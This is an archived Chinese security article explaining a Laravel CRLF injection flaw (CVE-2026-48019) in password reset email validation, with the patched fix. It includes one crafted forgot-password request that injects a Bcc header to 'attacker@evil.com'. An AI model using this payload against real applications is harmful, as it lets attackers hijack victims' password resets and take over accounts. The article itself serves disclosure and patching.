---
cve: "CVE-2026-48019"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  一个CRLF注入漏洞，竟能够进行密码重置邮件的操作？  
原创 HeArt
                    HeArt  船山信安   2026-06-17 04:10  
  
六月，Laravel曝出一个编号CVE-2026-48019的CRLF注入漏洞，CVSS给出 8.9 分，分别影响v12.x和v13.x版本，这一次的CRLF注入，它挑了个所有人都默认忽略的安全点进行切入，带来的影响是能够进行密码重置邮件的较为危险的操作。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquP5u5L60P74ANJaxfv17D0KQqlP1nkcSzBdfzYkNpOLekYBlwsNZffrmIY6o9zDH1HOdbr4Opxicaic294RYPGtyZgkr580qkjGk/640?wx_fmt=png&from=appmsg "")  
  
  
其中为Laravel的表单验证部分函数  
  
```
public function validateEmail($attribute, $value){    if (! is_string($value) && ! (is_object($value) && method_exists($value, '__toString'))) {        return false;    }    return filter_var($value, FILTER_VALIDATE_EMAIL) !== false;}
```  
  
  
  
漏洞的触发逻辑是比较容易的。攻击者无需登录任何账户，只需要跳转到密码重置页面，在邮箱输入框里填入下面的一点点的细节。  
  
```
POST /forgot-password HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedemail="victim%40example.com%0d%0aBcc%3A+attacker%40evil.com"%40example.com
```  
  
  
%0d%0a 就是 \r\n 的 URL 编码。  
  
其中Laravel的email验证规则只检查格式是否符合RFC标准，并没有剥离换行符，随后这个带着 CRLF 的地址被原样丢给Symfony Mailer 组件。Symfony的Address构造函数错误地接受了RFC-5322引用字符串中嵌有原始换行字节的邮箱地址。当邮件真正投递时，SMTP服务器看到的是两行：一行To指向原收件人；一行Bcc悄悄指向攻击者。  
  
从打开密码重置页面到攻击者邮箱收到同一封密码重置链接，整个过程不超过30秒。在操作期间，受害者收件箱里一切正常，没有任何异常提示。这才是最令人不安的地方。  
  
同时攻击者利用的是应用自身可信的邮件基础设施，因此，那些反垃圾系统、SPF、DKIM通通不会触发任何的警报。  
  
而官方给出的修复思路是在email验证规则里加了两行str_replace，把 \r 和 \n在传给Symfony之前直接剥掉。补丁也是Laravel v12.60.0 和v13.10.0发布。  
  
对于其依赖链的信任边界，大概是这几年反复踩的同一个坑了，出现的问题，能早点打补丁就尽早打。  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
